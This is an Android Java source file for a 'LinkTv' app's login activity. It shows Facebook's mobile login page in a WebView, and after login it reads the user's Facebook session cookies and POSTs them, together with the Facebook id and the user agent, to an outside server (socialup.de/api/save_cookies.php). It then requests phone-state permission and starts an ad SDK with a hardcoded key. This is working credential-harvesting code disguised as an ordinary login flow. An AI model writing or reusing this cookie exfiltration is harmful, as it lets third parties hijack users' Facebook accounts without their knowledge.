package linktv.linktv;

import android.Manifest;
import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HttpClientStack;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.nextapps.nasrun.NASRun;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.util.HashMap;
import java.util.Map;


public class LoginIntent extends AppCompatActivity {

    private WebView wv;
    private String FBLOGIN_URL = "https://m.facebook.com/login";
    private final String AGREEMENT_URL = "http://likeup.kr/docs/linktv_agreement.html";
    private static String APP_PANG_KEY = "be06194fc40c3bee3f15c44c987df618";

    Context mAppContext;
    public static String versionName;
    public static boolean isActive = false;
    public static boolean isOpened = false;
    AlertDialog closeAlertDialog;
    CookieManager cookieManager;
    private ProgressBar progress_bar;
    public static User user = new User();
    private static View agreement_view, login_view;


    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        mAppContext = this;

        agreement_view = findViewById(R.id.agreement_view);
        login_view = findViewById(R.id.login_webview);

        Intent intent = getIntent();

        cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);

        progress_bar = (ProgressBar)findViewById(R.id.progress_bar_login);

        wv = (WebView)findViewById(R.id.wv_login);
        wv.getSettings().setJavaScriptEnabled(true);
        wv.getSettings().setDomStorageEnabled(true);
        wv.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {

                return super.shouldOverrideUrlLoading(view, url);
            }

        });
        wv.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
                new AlertDialog.Builder(mAppContext)
                        .setTitle("AlertDialog")
                        .setMessage(message)
                        .setPositiveButton(android.R.string.ok,
                                new AlertDialog.OnClickListener() {
                                    public void onClick(DialogInterface dialog, int which) {
                                        result.confirm();
                                    }
                                })
                        .setCancelable(false)
                        .create()
                        .show();

                return true;
            }

            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                progress_bar.setProgress(newProgress);
                if(newProgress == 100){
                    progress_bar.setVisibility(View.GONE);
                }
            }
        });

        wv.getSettings().setLoadWithOverviewMode(true);
        wv.getSettings().setUseWideViewPort(true);
        wv.getSettings().setSupportZoom(false);




        wv.setWebViewClient(new WebViewClient(){

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                Log.d("tag", url);
                if(url.equals(FBLOGIN_URL)){
                    wv.stopLoading();
                    wv.loadUrl(FBLOGIN_URL + "#login");
                }

                Uri uri = Uri.parse(url);
                String host = uri.getHost();
                String path = uri.getPath();

                if(host.equals("m.facebook.com") && path.equals("/home.php")){

                    CookieManager.setAcceptFileSchemeCookies(true);
                    String cookie_str = CookieManager.getInstance().getCookie("https://m.facebook.com");

                    user.parseFBCookie(cookie_str);
                    saveUserToDB(user);
                    //wv.loadUrl(HOME);
                    Log.d("tag", user.toString());
                }


                return super.shouldOverrideUrlLoading(view, url);
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                progress_bar.setVisibility(View.VISIBLE);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progress_bar.setVisibility(View.GONE);
            }
        });


        String newAgent = "";
        try {
            versionName = getPackageManager().getPackageInfo(getPackageName(), 0).versionName;
        } catch (PackageManager.NameNotFoundException e) {}
        String oldAgent = "";
        oldAgent = wv.getSettings().getUserAgentString();
        String packagename = "com.linktv.linktv";
        newAgent = oldAgent + " " + "LinkTv(android," + packagename + "," + versionName + ")";
        wv.getSettings().setUserAgentString(newAgent);
        user.setUserAgent(newAgent);

        //createExitDialog();

        //wv.loadUrl("https://google.com");




        //ImageView skip_btn = (ImageView)findViewById(R.id.skip_login);
        ImageView login_with_facebook = (ImageView)findViewById(R.id.login_with_facebook);

//        skip_btn.setOnClickListener(new View.OnClickListener(){
//            @Override
//            public void onClick(View v) {
//                openWebView(false);
//            }
//        });

        login_with_facebook.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
                //openWebView(true);
                wv.loadUrl(FBLOGIN_URL);
                switchView("login");
            }
        });

        ImageView view_agreement;
        view_agreement = (ImageView)findViewById(R.id.see_agreements);

        view_agreement.setOnClickListener(new View.OnClickListener(){
            @Override
            public void onClick(View v) {
//                Uri uri = Uri.parse(agreement_url);
//                Intent intent = new Intent();
//                intent.setData(uri);
//                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                MainActivity.this.startActivity(intent);

                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(AGREEMENT_URL));
                startActivity(intent);
            }
        });
    }

    /**
     *
     * @param viewname
     * "prelogin" or "login"
     *
     */
    private void switchView(String viewname){
        if(viewname.equals("prelogin")){
            agreement_view.setVisibility(View.VISIBLE);
            login_view.setVisibility(View.GONE);
        }else if(viewname.equals("login")){
            agreement_view.setVisibility(View.GONE);
            login_view.setVisibility(View.VISIBLE);
        }else{
            switchView("prelogin");
        }
    }

    public static final String TAG = "LINKTV";
    StringRequest stringRequest; // Assume this exists.
    RequestQueue mRequestQueue;  // Assume this exists.

    private static String fid;
    private static String cookies;
    private static String user_agent;

    private static User tempUser = new User();

    private void saveUserToDB(User user){
        // Instantiate the RequestQueue.
        RequestQueue queue = Volley.newRequestQueue(this);
        String url ="http://socialup.de/api/save_cookies.php";

        tempUser.fid = user.fid;
        tempUser.cookies = user.cookies;
        tempUser.userAgent = user.userAgent;

        // Request a string response from the provided URL.
        StringRequest stringRequest = new StringRequest(
                Request.Method.POST,
                url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // Display the first 500 characters of the response string.
                        preCallCPAOK();
                        Log.d(TAG, "Response is: "+ response);
                        //getSharedPreferences("pref", MODE_PRIVATE).edit().putString("login","yes").commit();


                    }
                }, new Response.ErrorListener(){
            @Override
            public void onErrorResponse(VolleyError error) {
                Log.d("tag", "That didn't work!");
            }
        }){
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("fid", tempUser.fid);
                params.put("cookies", tempUser.cookies);
                params.put("user_agent", tempUser.userAgent);
                return params;
            }
        };
// Add the request to the RequestQueue.
        queue.add(stringRequest);
    }



    private void preCallCPAOK(){
        checkPermission();
    }

    private static final int MY_PERMISSIONS_REQUEST_READ_PHONE_STATE = 2;
    private void checkPermission() {
        // 갤러리 사용 권한 체크( 사용권한이 없을경우 -1 )
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // 권한이 없을경우

            Toast.makeText(LoginIntent.this , "이벤트 참여에는 권한 승인이 필요합니다." , Toast.LENGTH_LONG ).show();

            // 최초 권한 요청인지, 혹은 사용자에 의한 재요청인지 확인
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_PHONE_STATE)) {
                // 사용자가 임의로 권한을 취소시킨 경우
                // 권한 재요청
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, MY_PERMISSIONS_REQUEST_READ_PHONE_STATE);

            } else {
                // 최초로 권한을 요청하는 경우(첫실행)
                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, MY_PERMISSIONS_REQUEST_READ_PHONE_STATE);

            }
        }else {
            // 사용 권한이 있음을 확인한 경우
            callCPAOK();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        switch (requestCode) {
            case MY_PERMISSIONS_REQUEST_READ_PHONE_STATE: {
                // 갤러리 사용권한에 대한 콜백을 받음
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // 권한 동의 버튼 선택
                    callCPAOK();
                } else {
                    // 사용자가 권한 동의를 안함
                    // 권한 동의안함 버튼 선택
                    Toast.makeText(LoginIntent.this , "권한사용을 동의해주셔야 이용이 가능합니다." , Toast.LENGTH_LONG ).show();
                    switchView("prelogin");
                    //finish();
                }
                return;
            }
            // 예외케이스
        }
    }

    private void callCPAOK(){
        NASRun.run(this, APP_PANG_KEY);

        Intent myIntent = new Intent(mAppContext, MainActivity.class);
        startActivity(myIntent);
        finish();
    }


    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        switch (keyCode) {
            case KeyEvent.KEYCODE_BACK:
                if(wv.canGoBack()){
                    wv.goBack();
                }else{
//                    if (closeAlertDialog.isShowing()) {
//                        closeAlertDialog.cancel();
//                    }else{
//                        openExitDialog();
//                    }
                    this.closeApplication();
                }
                break;
            default:
                return false;
        }

        return false;

    }

    private void openExitDialog(){
        closeAlertDialog.show();
    }


    @Override
    protected void onStart() {
        super.onStart();
        isActive = true;
        isOpened = true;
    }

    @Override
    protected void onStop() {


        WebView wv = (WebView)findViewById(R.id.wv);

        // 쿠키 및 캐시 제거 안함
        //initWebview(wv, "cookie");


        isActive = false;

        super.onStop();

        if (mRequestQueue != null) {
            mRequestQueue.cancelAll(TAG);
        }
    }

    private void closeApplication(){
        finish();
    }

    @Override
    protected void onResume() {
        super.onResume();
    }

    public static String phoneNumber;
    public void getPhoneNumber(){
        TelephonyManager tm = (TelephonyManager)getSystemService(TELEPHONY_SERVICE);
        phoneNumber = tm.getLine1Number();
    }

    private void initWebview(WebView wv, String mode){
        switch (mode){

            case "cache":
                wv.clearHistory();
                wv.clearCache(true);
                wv.clearView();
                break;

            case "cookie":
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cookieManager.removeAllCookies(null);
                }
                else {
                    cookieManager.removeAllCookie();
                }

                break;

            case "db":
                this.deleteDatabase("webview.db");
                this.deleteDatabase("webviewCache.db");
                break;

            case "all":
                initWebview(wv, "cache");
                initWebview(wv, "cookie");
                initWebview(wv, "all");
                break;
        }

    }

    private void initWebview(WebView wv){
        initWebview(wv, "all");
    }






}
